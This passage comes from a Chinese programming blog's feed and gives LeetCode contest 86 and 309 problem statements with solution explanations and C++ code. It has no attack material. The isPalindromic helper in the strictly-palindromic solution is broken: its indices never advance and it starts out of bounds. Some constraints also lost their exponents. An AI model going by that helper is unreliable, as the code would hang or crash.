class="built_in">Point</span>(a[<span class="number">0</span>], a[<span class="number">1</span>]), xxx::<span class="built_in">Point</span>(a[<span class="number">2</span>], a[<span class="number">3</span>]), xxx::<span class="built_in">Point</span>(b[<span class="number">0</span>], b[<span class="number">1</span>]), b[<span class="number">2</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (res.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;f, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (x != f[x]) &#123;</span><br><span class="line">            x = f[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">uni</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;f, <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> fx = <span class="built_in">find</span>(f, x);</span><br><span class="line">        <span class="type">int</span> fy = <span class="built_in">find</span>(f, y);</span><br><span class="line">        f[fx] = fy;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">antPass</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; geometry, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; path)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = geometry.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = path.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">f</span><span class="params">(m, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            f[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">isIntersect</span>(geometry[i], geometry[j])) &#123;</span><br><span class="line">                    <span class="built_in">uni</span>(f, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">bool</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;v : path) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(f, v[<span class="number">0</span>]) == <span class="built_in">find</span>(f, v[<span class="number">1</span>])) &#123;</span><br><span class="line">                ans.<span class="built_in">emplace_back</span>(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans.<span class="built_in">emplace_back</span>(<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 86</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/31/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-86"><a href="#leetcode-biweekly-contest-86" class="headerlink" title="leetcode biweekly contest 86"></a>leetcode biweekly contest 86</h2><p>最后一题翻译太稀烂，错了好长时间，最后只能看英文。</p>
<h4 id="6171-和相等的子数组"><a href="#6171-和相等的子数组" class="headerlink" title="6171. 和相等的子数组"></a>6171. 和相等的子数组</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> ，判断是否存在 <strong>两个</strong> 长度为 <code>2</code> 的子数组且它们的 <strong>和</strong> 相等。注意，这两个子数组起始位置的下标必须 <strong>不相同</strong> 。</p>
<p>如果这样的子数组存在，请返回 <code>true</code>，否则返回 <code>false</code> 。</p>
<p><strong>子数组</strong> 是一个数组中一段连续非空的元素组成的序列。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,2,4]</span><br><span class="line">输出：true</span><br><span class="line">解释：元素为 [4,2] 和 [2,4] 的子数组有相同的和 6 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4,5]</span><br><span class="line">输出：false</span><br><span class="line">解释：没有长度为 2 的两个子数组和相等。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,0,0]</span><br><span class="line">输出：true</span><br><span class="line">解释：子数组 [nums[0],nums[1]] 和 [nums[1],nums[2]] 的和相等，都为 0 。</span><br><span class="line">注意即使子数组的元素相同，这两个子数组也视为不相同的子数组，因为它们在原数组中的起始位置不同。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 1000</code></li>
<li><code>-109 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<p>&#96;</p>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-86/problems/find-subarrays-with-equal-sum/">https://leetcode.cn/contest/biweekly-contest-86/problems/find-subarrays-with-equal-sum/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希统计
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，我们直接统计所有相邻两个元素的和，如果出现相同，则返回 $true$，否则则返回 $false$.</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">findSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;<span class="type">long</span> <span class="type">long</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> sum = nums[i] + nums[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">count</span>(sum)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cnt.<span class="built_in">emplace</span>(sum);</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6172-严格回文的数字"><a href="#6172-严格回文的数字" class="headerlink" title="6172. 严格回文的数字"></a>6172. 严格回文的数字</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>如果一个整数 <code>n</code> 在 <code>b</code> 进制下（<code>b</code> 为 <code>2</code> 到 <code>n - 2</code> 之间的所有整数）对应的字符串 <strong>全部</strong> 都是 <strong>回文的</strong> ，那么我们称这个数 <code>n</code> 是 <strong>严格回文</strong> 的。</p>
<p>给你一个整数 <code>n</code> ，如果 <code>n</code> 是 <strong>严格回文</strong> 的，请返回 <code>true</code> ，否则返回 <code>false</code> 。</p>
<p>如果一个字符串从前往后读和从后往前读完全相同，那么这个字符串是 <strong>回文的</strong> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 9</span><br><span class="line">输出：false</span><br><span class="line">解释：在 2 进制下：9 = 1001 ，是回文的。</span><br><span class="line">在 3 进制下：9 = 100 ，不是回文的。</span><br><span class="line">所以，9 不是严格回文数字，我们返回 false 。</span><br><span class="line">注意在 4, 5, 6 和 7 进制下，n = 9 都不是回文的。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：false</span><br><span class="line">解释：我们只考虑 2 进制：4 = 100 ，不是回文的。</span><br><span class="line">所以我们返回 false 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>4 &lt;= n &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-86/problems/strictly-palindromic-number/">https://leetcode.cn/contest/biweekly-contest-86/problems/strictly-palindromic-number/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接检测
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个就非常直接了，直接将 $n$ 分别转换为对应 $[2,n-2]$ 进制数，然后依次检测转换后的数 $x$ 是否时回文即可。 </li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log n)$，$n$ 表示给定的元素 $n$。</li>
<li>空间复杂度：时间复杂度为 $O(\log n)$，$n$ 表示给定的元素 $n$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindromic</span><span class="params">(string &amp;s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[l] != s[r]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isStrictlyPalindromic</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            string s;</span><br><span class="line">            <span class="type">int</span> x = n;</span><br><span class="line">            <span class="keyword">while</span> (x) &#123;</span><br><span class="line">                <span class="type">char</span> c = <span class="string">&#x27;0&#x27;</span> + (x % i);</span><br><span class="line">                x /= i;</span><br><span class="line">                s.<span class="built_in">push_back</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isPalindromic</span>(s)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6173-被列覆盖的最多行数"><a href="#6173-被列覆盖的最多行数" class="headerlink" title="6173. 被列覆盖的最多行数"></a>6173. 被列覆盖的最多行数</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <strong>0</strong> 开始的 <code>m x n</code> 二进制矩阵 <code>mat</code> 和一个整数 <code>cols</code> ，表示你需要选出的列数。</p>
<p>如果一行中，所有的 <code>1</code> 都被你选中的列所覆盖，那么我们称这一行 <strong>被覆盖</strong> 了。</p>
<p>请你返回在选择 <code>cols</code> 列的情况下，<strong>被覆盖</strong> 的行数 <strong>最大</strong> 为多少。</p>
<p><strong>示例 1：</strong></p>
<p><strong><img src="https://assets.leetcode.com/uploads/2022/07/14/rowscovered.png" alt="img"></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：mat = [[0,0,0],[1,0,1],[0,1,1],[0,0,1]], cols = 2</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">如上图所示，覆盖 3 行的一种可行办法是选择第 0 和第 2 列。</span><br><span class="line">可以看出，不存在大于 3 行被覆盖的方案，所以我们返回 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><strong><img src="https://assets.leetcode.com/uploads/2022/07/14/rowscovered2.png" alt="img"></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：mat = [[1],[0]], cols = 1</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">选择唯一的一列，两行都被覆盖了，原因是整个矩阵都被覆盖了。</span><br><span class="line">所以我们返回 2 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>m == mat.length</code></li>
<li><code>n == mat[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 12</code></li>
<li><code>mat[i][j]</code> 要么是 <code>0</code> 要么是 <code>1</code> 。</li>
<li><code>1 &lt;= cols &lt;= n</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-86/problems/maximum-rows-covered-by-columns/">https://leetcode.cn/contest/biweekly-contest-86/problems/maximum-rows-covered-by-columns/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>位图运算
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们可以将矩阵中的第 $i$ 行都转换为二进制位图 $mask[i]$；我们依次检测 $i$ 所代表的列的位图，其中 $i$ 的第 $k$ 为 $1$ 则表示将矩阵的第 $k$ 列进行覆盖，我们依次检测每一行是否在位图 $i$ 所代表的覆盖方案下，该行中的 $1$ 是否全部被覆盖，我们可以用位运算，如果满足:<blockquote>
<p>$mask[j] \And i &#x3D; mask[j]$</p>
</blockquote>
</li>
</ol>
<p>则 $mask[j]$ 一定是 $i$ 的子集，此时 $i$ 一定可以覆盖 $mask[j]$，从而我们即可判断出有多少行可以被覆盖。<br>2. 复杂度分析</p>
<ul>
<li>时间复杂度：时间复杂度为 $O(m \times n + m \times 2^n)$，其中 $m,n$ 分别为矩阵的行数与列数。</li>
<li>空间复杂度：空间复杂度为 $O(m)$，其中 $m$ 为矩阵的行数。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumRows</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mat, <span class="type">int</span> cols)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; mask;</span><br><span class="line">        <span class="type">int</span> m = mat.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = mat[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mat[i][j]) &#123;</span><br><span class="line">                    x |= (<span class="number">1</span> &lt;&lt; j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mask.<span class="built_in">push_back</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_popcount(i) == cols) &#123;</span><br><span class="line">                <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((mask[j] &amp; i) == mask[j]) &#123;</span><br><span class="line">                        curr++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, curr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6143-预算内的最多机器人数目"><a href="#6143-预算内的最多机器人数目" class="headerlink" title="6143. 预算内的最多机器人数目"></a>6143. 预算内的最多机器人数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>你有 <code>n</code> 个机器人，给你两个下标从 <strong>0</strong> 开始的整数数组 <code>chargeTimes</code> 和 <code>runningCosts</code> ，两者长度都为 <code>n</code> 。第 <code>i</code> 个机器人充电时间为 <code>chargeTimes[i]</code> 单位时间，花费 <code>runningCosts[i]</code> 单位时间运行。再给你一个整数 <code>budget</code> 。</p>
<p>运行 <code>k</code> 个机器人 <strong>总开销</strong> 是 <code>max(chargeTimes) + k * sum(runningCosts)</code> ，其中 <code>max(chargeTimes)</code> 是这 <code>k</code> 个机器人中最大充电时间，<code>sum(runningCosts)</code> 是这 <code>k</code> 个机器人的运行时间之和。</p>
<p>请你返回在 <strong>不超过</strong> <code>budget</code> 的前提下，你 <strong>最多</strong> 可以 <strong>连续</strong> 运行的机器人数目为多少。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：chargeTimes = [3,6,1,3,4], runningCosts = [2,1,3,4,5], budget = 25</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">可以在 budget 以内运行所有单个机器人或者连续运行 2 个机器人。</span><br><span class="line">选择前 3 个机器人，可以得到答案最大值 3 。总开销是 max(3,6,1) + 3 * sum(2,1,3) = 6 + 3 * 6 = 24 ，小于 25 。</span><br><span class="line">可以看出无法在 budget 以内连续运行超过 3 个机器人，所以我们返回 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：chargeTimes = [11,12,19], runningCosts = [10,8,7], budget = 19</span><br><span class="line">输出：0</span><br><span class="line">解释：即使运行任何一个单个机器人，还是会超出 budget，所以我们返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>chargeTimes.length == runningCosts.length == n</code></li>
<li><code>1 &lt;= n &lt;= 5 * 104</code></li>
<li><code>1 &lt;= chargeTimes[i], runningCosts[i] &lt;= 105</code></li>
<li><code>1 &lt;= budget &lt;= 1015</code></li>
</ul>
<p>&#96;</p>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-86/problems/maximum-number-of-robots-within-budget/">https://leetcode.cn/contest/biweekly-contest-86/problems/maximum-number-of-robots-within-budget/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>二分查找的解法就比较简单了，时间复杂度为 $n \times (\log n)^2$，在题目给定的测试用例下会超时。</li>
<li>我们还可以采用滑动窗口的解法，设当前窗口为 $[j,i]$, 每次我们向右移动一个位置后，此时窗口变为 $[i, j +1]$，我们检测当前的窗口是否满足题目要求，如果满足则记录，否则则将窗口的左起点进行缩小知道窗口满足题目要求即可。需要使用技巧的是，我们可以用 $treeset$ 保存窗口中的所有数据，可以在 $O(1)$ 的时间复杂度内得到窗口中最大的值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \times \log n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumRobots</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; chargeTimes, vector&lt;<span class="type">int</span>&gt;&amp; runningCosts, <span class="type">long</span> <span class="type">long</span> budget)</span> </span>&#123;</span><br><span class="line">        multiset&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = chargeTimes.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(chargeTimes[i]);</span><br><span class="line">            sum += runningCosts[i];</span><br><span class="line">            <span class="keyword">while</span> (j &lt;= i &amp;&amp; sum * cnt.<span class="built_in">size</span>() + *cnt.<span class="built_in">rbegin</span>() &gt; budget) &#123;</span><br><span class="line">                cnt.<span class="built_in">erase</span>(cnt.<span class="built_in">find</span>(chargeTimes[j]));</span><br><span class="line">                sum -= runningCosts[j];</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, (<span class="type">int</span>)cnt.<span class="built_in">size</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 309</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/32/</url>
    <content><![CDATA[<h2 id="leetcode-contest-309"><a href="#leetcode-contest-309" class="headerlink" title="leetcode contest 309"></a>leetcode contest 309</h2><p>今天周赛的题目质量还算蛮高，都不是特别水的题目，还是非常好的题目</p>
<h4 id="6167-检查相同字母间的距离"><a href="#6167-检查相同字母间的距离" class="headerlink" title="6167. 检查相同字母间的距离"></a>6167. 检查相同字母间的距离</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <strong>0</strong> 开始的字符串 <code>s</code> ，该字符串仅由小写英文字母组成，<code>s</code> 中的每个字母都 <strong>恰好</strong> 出现 <strong>两次</strong> 。另给你一个下标从 <strong>0</strong> 开始、长度为 <code>26</code> 的的整数数组 <code>distance</code> 。</p>
<p>字母表中的每个字母按从 <code>0</code> 到 <code>25</code> 依次编号（即，<code>&#39;a&#39; -&gt; 0</code>, <code>&#39;b&#39; -&gt; 1</code>, <code>&#39;c&#39; -&gt; 2</code>, … , <code>&#39;z&#39; -&gt; 25</code>）。</p>
<p>在一个 <strong>匀整</strong> 字符串中，第 <code>i</code> 个字母的两次出现之间的字母数量是 <code>distance[i]</code> 。如果第 <code>i</code> 个字母没有在 <code>s</code> 中出现，那么 <code>distance[i]</code> 可以 <strong>忽略</strong> 。</p>
<p>如果 <code>s</code> 是一个 <strong>匀整</strong> 字符串，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abaccb&quot;, distance = [1,3,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">- &#x27;a&#x27; 在下标 0 和下标 2 处出现，所以满足 distance[0] = 1 。</span><br><span class="line">- &#x27;b&#x27; 在下标 1 和下标 5 处出现，所以满足 distance[1] = 3 。</span><br><span class="line">- &#x27;c&#x27; 在下标 3 和下标 4 处出现，所以满足 distance[2] = 0 。</span><br><span class="line">注意 distance[3] = 5 ，但是由于 &#x27;d&#x27; 没有在 s 中出现，可以忽略。</span><br><span class="line">因为 s 是一个匀整字符串，返回 true 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;aa&quot;, distance = [1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">- &#x27;a&#x27; 在下标 0 和 1 处出现，所以两次出现之间的字母数量为 0 。</span><br><span class="line">但是 distance[0] = 1 ，s 不是一个匀整字符串。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= s.length &lt;= 52</code></li>
<li><code>s</code> 仅由小写英文字母组成</li>
<li><code>s</code> 中的每个字母恰好出现两次</li>
<li><code>distance.length == 26</code></li>
<li><code>0 &lt;= distance[i] &lt;= 50</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-309/problems/check-distances-between-same-letters/">https://leetcode.cn/contest/weekly-contest-309/problems/check-distances-between-same-letters/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们可以直接遍历该数组即可， 直接找到相同字母之间的距离是否与数组 $distance$ 相同。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$ 表示字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkDistances</span><span class="params">(string s, vector&lt;<span class="type">int</span>&gt;&amp; distance)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j != i &amp;&amp; s[i] == s[j]) &#123;</span><br><span class="line">                    <span class="type">int</span> x = <span class="built_in">abs</span>(i - j) - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (distance[s[i] - <span class="string">&#x27;a&#x27;</span>] != x) &#123;</span><br><span class="line">     